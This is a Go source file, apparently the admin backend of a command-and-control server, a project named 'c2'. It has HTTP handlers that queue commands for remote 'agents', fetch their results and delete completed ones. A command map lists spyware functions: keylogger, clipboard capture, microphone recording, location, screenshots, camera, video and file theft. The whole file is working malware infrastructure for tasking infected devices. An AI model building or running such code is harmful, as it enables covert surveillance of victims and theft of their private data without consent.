package admin

import (
	"c2/database"
	"c2/utils"
	"database/sql"
	"encoding/json"
	"net/http"
	"strings"
	"time"

	"github.com/gorilla/mux"
)

type CommandRequest struct {
	Command string `json:"command"`
}

var commandExtensionMap = map[string]string{
	"clipboard":  ".txt",
	"keylogger":  ".txt",
	"mic":        ".wav",
	"location":   ".json",
	"screenshot": ".png",
	"camera":     ".jpg",
	"video":      ".mp4",
	"get_file":   ".zip", // fallback general file fetch
}

func SendCommand(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	agentID := vars["agent_id"]

	var req CommandRequest
	err := json.NewDecoder(r.Body).Decode(&req)
	if err != nil || req.Command == "" {
		utils.LogError("Invalid command request")
		http.Error(w, "Invalid input", http.StatusBadRequest)
		return
	}

	// Tentukan ekstensi berdasarkan command (jika perlu)
	command := strings.ToLower(req.Command)
	ext, ok := commandExtensionMap[command]
	if !ok {
		utils.LogWarning("Unknown command type sent: " + command)
		ext = "" // tetap kirim, tapi tanpa ekspektasi file
	}

	db := database.Connect()
	defer db.Close()

	_, err = db.Exec(`
		INSERT INTO commands (agent_id, command, status, created_at)
		VALUES (?, ?, 'pending', ?)
	`, agentID, req.Command, time.Now())
	if err != nil {
		utils.LogError("Failed to insert command: " + err.Error())
		http.Error(w, "Failed to send command", http.StatusInternalServerError)
		return
	}

	utils.LogInfo("Command sent to agent: " + agentID + " -> " + req.Command + " (" + ext + ")")
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{
		"message":  "Command sent successfully",
		"expected": ext,
	})
}

func GetCommandsByAgent(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	agentID := vars["agent_id"]

	db := database.Connect()
	defer db.Close()

	rows, err := db.Query(`
		SELECT id, agent_id, command, status, result, created_at, executed_at
		FROM commands
		WHERE agent_id = ?
		ORDER BY created_at DESC
	`, agentID)

	if err != nil {
		utils.LogError("Failed to query commands: " + err.Error())
		http.Error(w, "Failed to get commands", http.StatusInternalServerError)
		return
	}
	defer rows.Close()

	var commands []map[string]interface{}

	for rows.Next() {
		var cmdID int
		var agent, cmdText, status, createdAt string
		var result sql.NullString
		var executedAt sql.NullString

		err := rows.Scan(&cmdID, &agent, &cmdText, &status, &result, &createdAt, &executedAt)
		if err != nil {
			utils.LogError("Failed to scan command row: " + err.Error())
			continue
		}

		command := map[string]interface{}{
			"id":          cmdID,
			"agent_id":    agent,
			"command":     cmdText,
			"status":      status,
			"result":      "", // default
			"created_at":  createdAt,
			"executed_at": "", // default
		}

		if result.Valid {
			command["result"] = result.String
		}
		if executedAt.Valid {
			command["executed_at"] = executedAt.String
		}

		commands = append(commands, command)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(commands)
}

// DeleteCommand will remove the command if its status is 'completed' and has a result.
func DeleteCommand(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	commandID := vars["id"]

	// Connect to the database
	db := database.Connect()
	defer db.Close()

	// Check if the command exists and is 'completed' with a result
	var status, result string
	err := db.QueryRow(`
		SELECT status, result FROM commands WHERE id = ?`, commandID).Scan(&status, &result)
	if err != nil {
		utils.LogError("Failed to query command: " + err.Error())
		http.Error(w, "Command not found", http.StatusNotFound)
		return
	}

	// Only allow deletion if the command is 'completed' and has a result
	if status != "completed" || result == "" {
		utils.LogWarning("Command cannot be deleted, invalid status or no result: " + commandID)
		http.Error(w, "Command cannot be deleted", http.StatusBadRequest)
		return
	}

	// Delete the command from the database
	_, err = db.Exec(`DELETE FROM commands WHERE id = ?`, commandID)
	if err != nil {
		utils.LogError("Failed to delete command: " + err.Error())
		http.Error(w, "Failed to delete command", http.StatusInternalServerError)
		return
	}

	utils.LogInfo("Command deleted successfully: " + commandID)
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("Command deleted successfully"))
}
